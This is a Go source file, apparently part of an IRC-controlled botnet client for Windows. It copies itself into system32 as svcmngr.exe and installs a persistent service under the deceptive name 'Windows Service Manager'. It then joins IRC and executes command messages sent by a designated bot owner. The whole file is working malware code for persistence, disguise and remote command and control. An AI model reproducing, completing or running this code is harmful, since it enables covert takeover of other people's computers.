package main

import (
	"log"
	"fmt"
	"os"
	"io"
	"os/exec"

	"github.com/thoj/go-ircevent"
	"github.com/kardianos/service"
)

var logger service.Logger
type program struct{}


//ReadyIRC IRC Client hazırlar
func ReadyIRC() {
	connectionToIRC := ConnectToIRC(false)
	connectionToIRC.AddCallback("PRIVMSG", onPrivMsg)
	connectionToIRC.Loop()
}

func onPrivMsg(e *irc.Event) {
	if (e.User == botOwner) {
		message := e.Arguments[1]
		CommandParser(message, e.Connection)
	}
} 

func (p *program) Start(s service.Service) error {
	go p.run(s)
	return nil
}

func (p *program) run(s service.Service) {
	fmt.Println("sel")
	if _, err := os.Stat(os.Getenv("windir") + "\\system32\\svcmngr.exe"); os.IsNotExist(err) {
  		if CopyExe() == true {
  	 		go exec.Command(os.Getenv("windir") + "\\system32\\svcmngr.exe").Start()
  			fmt.Println("Exe kopyalandı ve calıştırıldı")
  			//os.Exit(0)
  		}
	} else { 
		exePath, errPath := os.Executable()
		if errPath == nil && exePath == os.Getenv("windir") + "\\system32\\svcmngr.exe" {
			fmt.Println("Servis indiriliyor")
			err := s.Install()
			if err != nil {
				fmt.Println(s.Uninstall())
				fmt.Println(s.Install())
			}
			ReadyIRC()
			//go junkFunc()
		}
	}
}

func (p *program) Stop(s service.Service) error {
	return nil
}

func CopyExe() bool {
	exePath, errPath := os.Executable()
	if errPath == nil{
		f,errOpen := os.Open(exePath)
		defer f.Close()
		if errOpen == nil {
			output, errCreate := os.Create(os.Getenv("windir") + "\\system32\\svcmngr.exe")
			defer output.Close()
			if errCreate == nil {
				_, errCopy := io.Copy(output, f)
				if (errCopy != nil) {
					fmt.Println(errCopy)
					return false
				} else {
					return true
				}
			}
		}
	}
	return false
}

func main() {
	svcConfig := &service.Config{
		Name:        "svcmngr",
		DisplayName: "Windows Service Manager",
		Description: "Manages the Windows Services.",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}
	logger, err = s.Logger(nil)
	if err != nil {
		log.Fatal(err)
	}
	err = s.Run()
	if err != nil {
		logger.Error(err)
	}
}